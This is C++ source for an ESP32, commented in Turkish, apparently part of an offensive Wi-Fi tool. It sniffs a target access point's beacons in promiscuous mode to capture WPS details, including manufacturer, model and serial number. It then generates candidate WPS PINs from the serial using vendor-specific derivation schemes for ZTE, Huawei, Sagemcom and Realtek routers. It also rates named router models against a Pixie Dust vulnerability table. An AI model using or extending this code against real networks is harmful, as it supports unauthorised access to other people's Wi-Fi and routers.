#include <WiFi.h>
#include <esp_wifi.h>
#include "wps_beacon_ie.h"
#include "definitions.h"

wps_device_info_t wps_device_info = {};

#define WPS_ATTR_MANUFACTURER   0x1021
#define WPS_ATTR_DEVICE_NAME    0x1011
#define WPS_ATTR_MODEL_NAME     0x1023
#define WPS_ATTR_MODEL_NUMBER   0x1024
#define WPS_ATTR_SERIAL_NUMBER  0x1042
#define WPS_ATTR_AP_LOCKED      0x1057

static const uint8_t WPS_OUI[4] = {0x00, 0x50, 0xF2, 0x04};

static volatile bool     g_done     = false;
static uint8_t           g_bssid[6] = {0};
static wps_device_info_t *g_info    = nullptr;

// ─── WPS TLV parser ───────────────────────────────────────────────────────────
static void parse_wps_tlv(const uint8_t *data, int len, wps_device_info_t *info) {
    int pos = 0;
    while (pos + 4 <= len) {
        uint16_t id   = ((uint16_t)data[pos] << 8) | data[pos+1];
        uint16_t alen = ((uint16_t)data[pos+2] << 8) | data[pos+3];
        pos += 4;
        if (pos + alen > len) break;

        int cp;
        switch (id) {
            case WPS_ATTR_MANUFACTURER:
                cp = min((int)alen, 63);
                memcpy(info->manufacturer, data+pos, cp);
                info->manufacturer[cp] = '\0';
                break;
            case WPS_ATTR_MODEL_NAME:
                cp = min((int)alen, 63);
                memcpy(info->model_name, data+pos, cp);
                info->model_name[cp] = '\0';
                break;
            case WPS_ATTR_MODEL_NUMBER:
                cp = min((int)alen, 31);
                memcpy(info->model_number, data+pos, cp);
                info->model_number[cp] = '\0';
                break;
            case WPS_ATTR_SERIAL_NUMBER:
                cp = min((int)alen, 31);
                memcpy(info->serial_number, data+pos, cp);
                info->serial_number[cp] = '\0';
                break;
            case WPS_ATTR_DEVICE_NAME:
                cp = min((int)alen, 63);
                memcpy(info->device_name, data+pos, cp);
                info->device_name[cp] = '\0';
                break;
            case WPS_ATTR_AP_LOCKED:
                if (alen >= 1) info->ap_setup_locked = (data[pos] != 0);
                break;
            default: break;
        }
        pos += alen;
    }
    info->valid = true;
}

// ─── Promiscuous beacon sniffer ───────────────────────────────────────────────
static void IRAM_ATTR ie_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (g_done || !g_info) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *pl  = raw->payload;
    int            plen = raw->rx_ctrl.sig_len;

    if (plen < 38) return;

    uint8_t subtype = (pl[0] >> 4) & 0x0F;
    if (subtype != 8 && subtype != 5) return; // Beacon=8, ProbeResp=5

    // BSSID is at bytes 16-21 in mgmt frames
    if (memcmp(pl + 16, g_bssid, 6) != 0) return;

    // IEs start at offset 36 (24 header + 12 fixed beacon fields)
    const uint8_t *ie    = pl + 36;
    int            ielen = plen - 36;
    int            pos   = 0;

    while (pos + 2 <= ielen) {
        uint8_t ie_id = ie[pos];
        uint8_t ie_sz = ie[pos+1];
        pos += 2;
        if (pos + ie_sz > ielen) break;

        // Vendor-specific IE (221) with WPS OUI
        if (ie_id == 221 && ie_sz >= 4 && memcmp(ie+pos, WPS_OUI, 4) == 0) {
            parse_wps_tlv(ie+pos+4, ie_sz-4, g_info);
            g_done = true;
        }
        pos += ie_sz;
    }
}

// ─── Public: capture WPS IE from beacons ─────────────────────────────────────
bool wps_capture_device_info(const uint8_t *bssid, int channel, uint32_t timeout_ms) {
    memset(&wps_device_info, 0, sizeof(wps_device_info));
    g_done = false;
    g_info = &wps_device_info;
    memcpy(g_bssid, bssid, 6);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t mf = { WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&mf);
    esp_wifi_set_promiscuous_rx_cb(&ie_sniffer);

    unsigned long deadline = millis() + timeout_ms;
    while (!g_done && millis() < deadline) delay(10);

    esp_wifi_set_promiscuous(false);
    g_info = nullptr;

    if (wps_device_info.valid) {
        wps_assess_pixie_risk(wps_device_info);
        DEBUG_PRINTF("WPS IE: Mfr=[%s] Model=[%s] ModelNo=[%s] Serial=[%s] Locked=%d\n",
            wps_device_info.manufacturer, wps_device_info.model_name,
            wps_device_info.model_number, wps_device_info.serial_number,
            wps_device_info.ap_setup_locked);
    } else {
        DEBUG_PRINTLN("WPS IE: Beacon IE yakalanmadi (WPS IE yok veya zaman asimi)");
    }
    return wps_device_info.valid;
}

// ─── WPS PIN checksum (8. hane) ──────────────────────────────────────────────
uint8_t wps_pin_checksum(uint32_t pin7) {
    uint32_t p = pin7 * 10;
    uint32_t acc = 0;
    for (int i = 7; i >= 0; i--) {
        uint32_t d = p % 10; p /= 10;
        acc += (i % 2 == 0) ? d * 3 : d;
    }
    return (uint8_t)((10 - (acc % 10)) % 10);
}

static void make_pin_str(uint32_t val7, char *out9) {
    uint32_t v  = val7 % 10000000UL;
    uint8_t  cs = wps_pin_checksum(v);
    snprintf(out9, 9, "%07lu%u", (unsigned long)v, cs);
}

// ─── Serial → PIN kandidatları ────────────────────────────────────────────────
// Strateji: ZTE/Huawei/Sagemcom gibi modemlerde PIN, seri numarasının
// sayısal kısımlarından türetilir. Birden fazla türetme yöntemi denenir.
int wps_serial_to_pins(const char *serial, char pins[][9], int max_pins) {
    if (!serial || serial[0] == '\0') return 0;

    // Sadece rakamları çıkar
    char digits[32] = {};
    int dc = 0;
    for (int i = 0; serial[i] && dc < 31; i++)
        if (serial[i] >= '0' && serial[i] <= '9') digits[dc++] = serial[i];
    digits[dc] = '\0';
    if (dc < 3) return 0;

    int count = 0;
    auto add = [&](uint32_t v) {
        if (count >= max_pins) return;
        make_pin_str(v, pins[count++]);
    };

    // 1. Son 7 rakam (Huawei HG serisi, ZTE primer)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = dc-7; i < dc; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 2. İlk 7 rakam (bazı ISP firmware)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = 0; i < 7; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 3. Ortadaki 7 rakam (uzun seri numaraları için)
    if (dc > 9) {
        int mid = (dc - 7) / 2;
        uint32_t v = 0;
        for (int i = mid; i < mid+7; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 4. Son 7 rakam XOR ile bit dönüşümü (ZTE H108N varyant)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = dc-7; i < dc; i++) v = v*10 + (digits[i]-'0');
        add((v ^ 0x1234567UL) % 10000000UL);
    }
    // 5. Sagemcom F@st 3686 — seri hash (son 5+ilk 2 kombinasyonu)
    if (dc >= 7) {
        uint32_t a = 0, b = 0;
        for (int i = 0; i < 2; i++) a = a*10 + (digits[i]-'0');
        for (int i = dc-5; i < dc; i++) b = b*10 + (digits[i]-'0');
        add((a * 100000UL + b) % 10000000UL);
    }
    // 6. Polynomial hash of full serial (genel)
    {
        uint32_t h = 0;
        for (int i = 0; serial[i]; i++) h = h*31 + (uint8_t)serial[i];
        add(h % 10000000UL);
    }
    // 7. XOR-fold hash (eski Realtek firmware)
    {
        uint32_t h = 0x5A5A5A5AUL;
        for (int i = 0; serial[i]; i++) { h ^= (uint8_t)serial[i]; h = (h>>1)|(h<<31); }
        add(h % 10000000UL);
    }
    // 8. CRC32-lite (bazı Ralink/MediaTek tabanlı ISP modem)
    {
        uint32_t crc = 0xFFFFFFFFUL;
        for (int i = 0; serial[i]; i++) {
            crc ^= (uint8_t)serial[i];
            for (int b = 0; b < 8; b++) crc = (crc>>1) ^ (0xEDB88320UL & -(crc&1));
        }
        crc ^= 0xFFFFFFFFUL;
        add(crc % 10000000UL);
    }

    return count;
}

// ─── Pixie Dust açık veritabanı ───────────────────────────────────────────────
struct pixie_entry_t { const char *substr; uint8_t risk; const char *note; };

static const pixie_entry_t PIXIE_DB[] = {
    // ZTE — Realtek chipset, E-S1=E-S2=0 bilinen
    {"ZXV10 W300",   PIXIE_RISK_HIGH,   "ZTE ZXV10 W300  - E-S1=E-S2=0 tam acik"},
    {"ZXV10 W301",   PIXIE_RISK_HIGH,   "ZTE ZXV10 W301  - Realtek RNG acigi"},
    {"ZXV10 H201",   PIXIE_RISK_HIGH,   "ZTE ZXV10 H201  - Realtek chipset"},
    {"H108N",        PIXIE_RISK_HIGH,   "ZTE H108N       - Serial bazli PIN acigi"},
    {"H168N",        PIXIE_RISK_MEDIUM, "ZTE H168N       - firmware varyant"},
    {"F660",         PIXIE_RISK_MEDIUM, "ZTE F660        - kismi acik (eski FW)"},
    {"ZXHN H108",    PIXIE_RISK_HIGH,   "ZTE ZXHN H108   - E-S1=E-S2=0"},
    // D-Link — Ralink/Realtek karma
    {"DIR-600",      PIXIE_RISK_HIGH,   "D-Link DIR-600  - E-S1=E-S2=0 tam acik"},
    {"DIR-605",      PIXIE_RISK_HIGH,   "D-Link DIR-605  - E-S1=E-S2=0"},
    {"DIR-615",      PIXIE_RISK_HIGH,   "D-Link DIR-615  - Pixie Dust tam acik"},
    {"DIR-810",      PIXIE_RISK_MEDIUM, "D-Link DIR-810  - partial acik"},
    {"DIR-825",      PIXIE_RISK_MEDIUM, "D-Link DIR-825  - firmware varyant"},
    {"DSL-2750",     PIXIE_RISK_HIGH,   "D-Link DSL-2750 - ISP FW acigi"},
    {"DSL-2740",     PIXIE_RISK_HIGH,   "D-Link DSL-2740 - ISP FW acigi"},
    // Netgear — Broadcom bazı, Realtek bazı
    {"WNDR3700",     PIXIE_RISK_HIGH,   "Netgear WNDR3700  - E-S1=E-S2=0"},
    {"WNDR3800",     PIXIE_RISK_HIGH,   "Netgear WNDR3800  - Pixie Dust acigi"},
    {"WNR2000",      PIXIE_RISK_HIGH,   "Netgear WNR2000   - v2/v3/v4 tam acik"},
    {"WNR1000",      PIXIE_RISK_HIGH,   "Netgear WNR1000   - Pixie Dust acigi"},
    {"WNR3500",      PIXIE_RISK_MEDIUM, "Netgear WNR3500   - partial acik"},
    // TP-Link — Ralink/MediaTek karma
    {"TL-WR841N",    PIXIE_RISK_MEDIUM, "TP-Link TL-WR841N v8 - firmware bazli"},
    {"TL-WA701N",    PIXIE_RISK_HIGH,   "TP-Link TL-WA701N    - Pixie Dust acigi"},
    {"TL-WR740N",    PIXIE_RISK_HIGH,   "TP-Link TL-WR740N    - Realtek/Atheros"},
    {"TL-WR743N",    PIXIE_RISK_HIGH,   "TP-Link TL-WR743N    - Pixie Dust acigi"},
    {"TL-WR842N",    PIXIE_RISK_MEDIUM, "TP-Link TL-WR842N    - partial acik"},
    // Belkin
    {"F7D",          PIXIE_RISK_MEDIUM, "Belkin F7D serisi - Ralink chipset"},
    {"F9K",          PIXIE_RISK_MEDIUM, "Belkin F9K serisi - Ralink chipset"},
    // Buffalo — Ralink tabanlı
    {"WZR-HP",       PIXIE_RISK_HIGH,   "Buffalo WZR-HP   - Pixie Dust tam acik"},
    {"WHR-G300",     PIXIE_RISK_HIGH,   "Buffalo WHR-G300 - Ralink chipset"},
    {"WSR-300",      PIXIE_RISK_MEDIUM, "Buffalo WSR-300  - firmware varyant"},
    // Huawei — genellikle kilitli ama eski FW açık
    {"HG8245",       PIXIE_RISK_LOW,    "Huawei HG8245 - genellikle kilitli (eski FW: orta)"},
    {"HG8247",       PIXIE_RISK_LOW,    "Huawei HG8247 - genellikle kilitli"},
    {"B315",         PIXIE_RISK_LOW,    "Huawei B315  - LTE, kilitli beklenir"},
    // Comtrend — açık ISP cihazlar
    {"AR-5381",      PIXIE_RISK_HIGH,   "Comtrend AR-5381 - Ralink chipset"},
    {"VR-3025",      PIXIE_RISK_MEDIUM, "Comtrend VR-3025 - partial acik"},
    // Arcadyan / Askey
    {"VGV752",       PIXIE_RISK_MEDIUM, "Arcadyan VGV752  - Vodafone TR OEM"},
    // Realtek genel chipset tespiti
    {"RTL",          PIXIE_RISK_HIGH,   "Realtek chipset  - E-S1=E-S2=0 yuksek ihtimal"},
    {"Realtek",      PIXIE_RISK_HIGH,   "Realtek chipset  - E-S1=E-S2=0 yuksek ihtimal"},
    // Ralink/MediaTek
    {"Ralink",       PIXIE_RISK_MEDIUM, "Ralink chipset   - orta Pixie Dust riski"},
    {"MediaTek",     PIXIE_RISK_MEDIUM, "MediaTek chipset - orta Pixie Dust riski"},
    {"MT7"},         // placeholder handled below
};
static const int PIXIE_DB_SZ = (int)(sizeof(PIXIE_DB)/sizeof(PIXIE_DB[0])) - 1; // exclude MT7 placeholder

void wps_assess_pixie_risk(wps_device_info_t &info) {
    if (!info.valid) { info.pixie_risk = PIXIE_RISK_UNKNOWN; return; }
    strncpy(info.pixie_note, "Tanimsiz model - risk bilinemedi", 79);

    if (info.ap_setup_locked) {
        info.pixie_risk = PIXIE_RISK_LOW;
        strncpy(info.pixie_note, "WPS kilitli (AP_SETUP_LOCKED=1) - brute force bloklu", 79);
        return;
    }

    for (int i = 0; i < PIXIE_DB_SZ; i++) {
        if (!PIXIE_DB[i].substr) continue;
        if (strstr(info.model_name,   PIXIE_DB[i].substr) ||
            strstr(info.model_number, PIXIE_DB[i].substr) ||
            strstr(info.device_name,  PIXIE_DB[i].substr) ||
            strstr(info.manufacturer, PIXIE_DB[i].substr)) {
            info.pixie_risk = PIXIE_DB[i].risk;
            strncpy(info.pixie_note, PIXIE_DB[i].note, 79);
            info.pixie_note[79] = '\0';
            return;
        }
    }
    // MediaTek / MT7 check
    if (strstr(info.manufacturer, "MT7") || strstr(info.model_name, "MT7") ||
        strstr(info.model_number, "MT7")) {
        info.pixie_risk = PIXIE_RISK_MEDIUM;
        strncpy(info.pixie_note, "MediaTek MT7xxx chipset - orta Pixie Dust riski", 79);
        return;
    }
    info.pixie_risk = PIXIE_RISK_UNKNOWN;
}
